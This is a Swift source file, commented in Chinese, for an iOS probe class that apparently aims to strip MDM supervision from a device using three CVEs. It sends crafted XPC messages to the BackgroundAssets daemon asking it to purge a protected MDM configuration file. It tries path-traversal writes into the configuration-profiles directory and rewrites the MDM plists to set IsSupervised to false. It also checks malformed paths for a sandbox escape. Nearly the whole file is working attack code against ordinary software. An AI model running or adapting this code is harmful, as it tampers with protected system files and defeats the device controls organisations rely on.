//
//  DeepProbe.swift
//  多 CVE 深度探针（26.5.2 上修复版本均 > 当前版本，故全部在射程内）
//
//  1) CVE-2026-64747 BackgroundAssets —— 「App 可删除其无权限的文件」
//     真正发 XPC 字典消息给 com.apple.backgroundassets.user，打印 daemon 原始 reply。
//     只要 daemon 回了东西 -> 通道通、漏洞在，剩下是报文格式问题。
//  2) CVE-2026-86886 —— 路径遍历，「App 可修改受保护系统文件」(CWE-22)
//     对 MDM 目录做多种 ../ 穿越形态的写入尝试。
//  3) CVE-2026-64742 Game Center —— 「恶意 App 可突破沙箱」，路径解析剖析问题
//     用畸形路径形态调用文件 API，观察是否穿越。
//

import Foundation
import UIKit

// MARK: - XPC C API

private typealias XPCConnCreateFn = @convention(c) (UnsafePointer<CChar>, OpaquePointer?, UInt64) -> OpaquePointer?
private typealias XPCGetPidFn     = @convention(c) (OpaquePointer) -> Int32
private typealias XPCDictCreateFn = @convention(c) (OpaquePointer?, OpaquePointer?, Int) -> OpaquePointer
private typealias XPCDictSetStrFn = @convention(c) (OpaquePointer, UnsafePointer<CChar>, UnsafePointer<CChar>) -> Void
private typealias XPCDictSetIntFn = @convention(c) (OpaquePointer, UnsafePointer<CChar>, Int64) -> Void
private typealias XPCSendFn       = @convention(c) (OpaquePointer, OpaquePointer) -> Void
private typealias XPCSendSyncFn   = @convention(c) (OpaquePointer, OpaquePointer) -> OpaquePointer?
private typealias XPCDescFn       = @convention(c) (OpaquePointer) -> UnsafeMutablePointer<CChar>?

final class DeepProbe {

    static let shared = DeepProbe()
    private init() {}

    private func sym<T>(_ name: String) -> T? {
        guard let h = dlopen(nil, RTLD_NOW), let p = dlsym(h, name) else { return nil }
        return unsafeBitCast(p, to: T.self)
    }

    private func log(_ s: String) { BAPurge.log("[deep] " + s) }

    // MARK: 1) BA XPC 真实报文探针 (CVE-2026-64747)

    func probeBA() {
        log("=== CVE-2026-64747 BackgroundAssets XPC 探针 ===")
        guard let create: XPCConnCreateFn = sym("xpc_connection_create_mach_service") else { log("无 xpc_connection_create_mach_service"); return }
        guard let conn = create("com.apple.backgroundassets.user", nil, 0) else { log("连接创建失败"); return }
        log("连接已建立")

        if let getpid: XPCGetPidFn = sym("xpc_connection_get_pid") {
            log("daemon PID = \(getpid(conn))")
        }

        guard let dict: XPCDictCreateFn = sym("xpc_dictionary_create"),
              let setStr: XPCDictSetStrFn = sym("xpc_dictionary_set_string"),
              let setInt: XPCDictSetIntFn = sym("xpc_dictionary_set_int64") else {
            log("无 xpc_dictionary_* 符号"); return
        }

        let target = MDMPath.dir + "/CloudConfigurationDetails.plist"
        // 依次尝试几种报文形态，看 daemon 对哪种有反应
        let attempts: [[String: String]] = [
            ["selector": "markPurgeableWithFileURL:sandboxToken:reply:", "fileURL": target],
            ["method": "markPurgeableWithFileURL:sandboxToken:reply:", "path": target],
            ["command": "purge", "path": target],
        ]

        for (i, kv) in attempts.enumerated() {
            let msg = dict(nil, nil, 0)
            setInt(msg, "probeId", Int64(i))
            for (k, v) in kv { setStr(msg, k, v) }
            log("--- 报文 #\(i) ---")
            if let sendSync: XPCSendSyncFn = sym("xpc_connection_send_message_with_reply_sync") {
                log("send_message_with_reply_sync...")
                if let reply = sendSync(conn, msg) {
                    if let desc: XPCDescFn = sym("xpc_copy_description") {
                        if let d = desc(reply) {
                            log("REPLY: " + String(cString: d))
                            free(d)
                        } else { log("reply 存在但 description 为空") }
                    } else { log("有 reply（无 description 符号）") }
                } else { log("reply = nil（daem 未响应/无权限）") }
            } else {
                log("无 send_message_with_reply_sync，改用 send_message")
            }
            if let send: XPCSendFn = sym("xpc_connection_send_message") {
                send(conn, dict(nil, nil, 0))
            }
        }
        log("=== BA 探针结束：看是否有 REPLY / 非 nil ===")
    }

    // MARK: 2) 路径遍历 (CVE-2026-86886)

    func probeTraversal() {
        log("=== CVE-2026-86886 路径遍历写受保护文件 ===")
        let fm = FileManager.default
        let base = MDMPath.dir
        // 多种穿越形态，尝试在 MDM 目录写入探针文件
        let forms = [
            base + "/../Library/ConfigurationProfiles/deep_probe.txt",
            base + "/./deep_probe.txt",
            base + "/../../../../../../.." + base + "/deep_probe.txt",
            "/var/containers/Shared/SystemGroup/../Shared/SystemGroup/systemgroup.com.apple.configurationprofiles/Library/ConfigurationProfiles/deep_probe.txt",
        ]
        for f in forms {
            let ok = fm.createFile(atPath: f, contents: Data("probe".utf8))
            log("\(ok ? "写入成功 ✓" : "失败") : \(f)")
            if ok { try? fm.removeItem(atPath: f) }
        }

        // 直接改写 MDM plist（IsSupervised=false）
        for name in ["CloudConfigurationDetails.plist", "MDM.plist"] {
            let p = base + "/" + name
            guard fm.fileExists(atPath: p) else { log("不存在: \(name)"); continue }
            if var d = NSMutableDictionary(contentsOfFile: p) {
                d["IsSupervised"] = false
                d.removeObject(forKey: "OrganizationName")
                do {
                    let data = try PropertyListSerialization.data(fromPropertyList: d, format: .binary, options: 0)
                    try data.write(to: URL(fileURLWithPath: p))
                    log("改写成功 ✓ : \(name)")
                } catch { log("改写失败 \(name): \(error.localizedDescription)") }
            } else { log("无法解析: \(name)") }
        }
    }

    // MARK: 3) Game Center 路径解析 (CVE-2026-64742)

    func probeGameCenter() {
        log("=== CVE-2026-64742 Game Center 路径解析突破沙箱 ===")
        let fm = FileManager.default
        // 畸形/含空字节与点段的路径，触发路径剖析差异
        let weird = [
            MDMPath.dir + "/./../ConfigurationProfiles/CloudConfigurationDetails.plist",
            MDMPath.dir + "//CloudConfigurationDetails.plist",
            MDMPath.dir + "/./CloudConfigurationDetails.plist",
        ]
        for w in weird {
            var isDir: ObjCBool = false
            let e = fm.fileExists(atPath: w, isDirectory: &isDir)
            log("\(e ? "可达 ✓" : "不可达") : \(w)")
        }
        if let attrs = try? fm.attributesOfItem(atPath: MDMPath.dir) {
            log("目录属性: \(attrs[.ownerAccountName] ?? "?") / \(attrs[.posixPermissions] ?? "?")")
        }
    }

    // MARK: 一键全跑

    func runAll() {
        log("系统: \(UIDevice.current.systemVersion)")
        probeBA()
        probeTraversal()
        probeGameCenter()
        log("=== 全部探针结束，请把以上日志完整发回 ===")
    }
}
